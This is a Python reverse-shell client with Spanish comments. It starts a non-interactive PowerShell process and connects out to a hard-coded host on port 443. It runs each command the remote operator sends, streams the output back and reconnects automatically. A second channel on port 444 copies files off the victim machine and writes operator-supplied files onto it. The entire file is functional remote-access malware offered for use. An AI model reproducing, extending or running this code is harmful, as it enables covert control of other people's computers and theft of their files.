#!/usr/bin/env python3
import socket
import subprocess
import threading
import time
import struct
import queue
import os
import shlex

HOST = "192.168.100.138"
PORT = 443
FILE_TRANSFER_PORT = 444

SENTINEL     = b"<CMD_DONE>"
SENTINEL_STR = "<CMD_DONE>"
 
 
class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.proc = subprocess.Popen(
            ["powershell.exe", "-NoProfile", "-NoLogo", "-NonInteractive"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=0,
            universal_newlines=True
        )
        self.client_socket = None
        self.reader_thread = None
        self.cwd = ""

        # semaforos binarios
        #event.set()    # pone el estado en True
        #event.clear()  # pone el estado en False
        #event.wait()   # bloquea hasta que el estado sea True
        #event.is_set() # devuelve True o False sin bloquear
        self._stop_reader = threading.Event()
        self._cmd_ready   = threading.Event()
        self._cmd_ready.set()
 
        self._output_queue = queue.Queue()
 
        self._ps_reader = threading.Thread(target=self._ps_read, daemon=True)
        self._ps_reader.start()
 
    def _ps_read(self):
        """Lee stdout de PowerShell y encola cada línea."""
        for line in self.proc.stdout:  # pyright: ignore
            if line.startswith("PATH:"):
                self.cwd = line.replace("PATH:", "").strip()
            self._output_queue.put(line)
 
    def connect(self, host, port):
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.settimeout(10)
        self.client_socket.connect((host, port))
        self.client_socket.settimeout(None)
        self.client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
 
    def _recv_exact(self, client_socket, n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            chunk = client_socket.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("Server closed connection")
            buf += chunk
        return buf
 
    # powershell thread --> salida del terminal
    def read(self):
        while not self._stop_reader.is_set():
            try:
                line = self._output_queue.get(timeout=1)
            except queue.Empty:
                continue
 
            if line.strip() == SENTINEL_STR:
                try:
                    self.client_socket.sendall(  # pyright: ignore
                        struct.pack(">I", len(SENTINEL)) + SENTINEL
                    )
                    self._cmd_ready.set()
                except OSError:
                    break
                continue
 
            try:
                payload = line.encode()
                self.client_socket.sendall(  # pyright: ignore
                    struct.pack(">I", len(payload)) + payload
                )
            except OSError:
                break
 
    def _close_socket(self) -> None:
        if self.client_socket:
            try:
                self.client_socket.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                self.client_socket.close()
            except OSError:
                pass
            self.client_socket = None
 
    def recieve_data(self, client_socket) -> str:
        raw_len = self._recv_exact(client_socket, 4)
        msg_len = struct.unpack(">I", raw_len)[0]
        data    = self._recv_exact(client_socket, msg_len)
        return data.decode().strip()
 
    def _write_cmd(self, cmd: str) -> None:
        """Escribe el comando en PowerShell e inyecta path y sentinel al final."""
        self.proc.stdin.write(cmd + "\n")                              # pyright: ignore
        self.proc.stdin.flush()                                        # pyright: ignore
        self.proc.stdin.write('Write-Host "PATH:$(Get-Location)"\n')  # pyright: ignore
        self.proc.stdin.flush()                                        # pyright: ignore
        self.proc.stdin.write(f'Write-Host "{SENTINEL_STR}"\n')       # pyright: ignore
        self.proc.stdin.flush()                                        # pyright: ignore
    
    def upload_to_server(self, files):
        while True:
            try:
                new_client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                new_client_socket.connect((HOST, FILE_TRANSFER_PORT))
                break
            except ConnectionRefusedError:
                # El servidor aún no hizo .accept() o no está escuchando, por el caso de que se hace connect antes que accept del lado del server
                time.sleep(1)
            except Exception:
                return None
        
        for file in files:
            complete_path = os.path.join(self.cwd, file)

            if os.path.exists(complete_path) and os.path.isfile(complete_path):
                size = os.path.getsize(complete_path)
                new_client_socket.sendall(struct.pack("Q", size))

                with open(complete_path, "rb") as f:
                    while True:
                        chunk = f.read(4096)
                        if not chunk:
                            break
                        new_client_socket.sendall(chunk)
            else:
                new_client_socket.sendall(struct.pack("Q", 0)) # envio 0 para que el server no cuelge

            
        new_client_socket.close()
    
    def download_from_server(self, files):
        while True:
            try:
                new_client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                new_client_socket.connect((HOST, FILE_TRANSFER_PORT))
                break
            except ConnectionRefusedError:
                time.sleep(1)
            except Exception:
                return None

        for file in files:
            raw_size = new_client_socket.recv(8)
            if not raw_size:
                break
            file_size = struct.unpack("Q", raw_size)[0]
            if file_size == 0:
                continue
            bytes_received = 0
            filename = file.split("\\")[-1].split("/")[-1]
            with open(filename, "wb") as f:
                while bytes_received < file_size:
                    chunk = new_client_socket.recv(min(4096, file_size - bytes_received))
                    if not chunk:
                        break
                    f.write(chunk)
                    bytes_received += len(chunk)

        new_client_socket.close()

    def run(self):
        while True:
            try:
                self.connect(HOST, PORT)
 
                self._stop_reader.set()
                if self.reader_thread and self.reader_thread.is_alive():
                    self.reader_thread.join(timeout=2)
                self._stop_reader.clear()
                self._cmd_ready.set()
 
                self.reader_thread = threading.Thread(target=self.read, daemon=True)
                self.reader_thread.start()
 
                while True:
                    cmd = self.recieve_data(self.client_socket)
                    if cmd in ("exit", "quit"):
                        break
                    
                    if cmd.startswith("download "): # voy a subirle archivo
                        files = shlex.split(cmd)[1:]
                        self._cmd_ready.set()
                        threading.Thread(target=self.upload_to_server, args=(files,), daemon=True).start()
                        continue

                    if cmd.startswith("upload "): # voy a descargar archivo al local
                        files = shlex.split(cmd)[1:]
                        self._cmd_ready.set()
                        threading.Thread(target=self.download_from_server, args=(files,), daemon=True).start()
                        continue
                    self._cmd_ready.wait()
                    self._cmd_ready.clear()
 
                    self._write_cmd(cmd)
 
            except Exception:
                self._close_socket()
                time.sleep(5)
 
 
if __name__ == "__main__":
    my_client = Client(HOST, PORT)
    my_client.run()
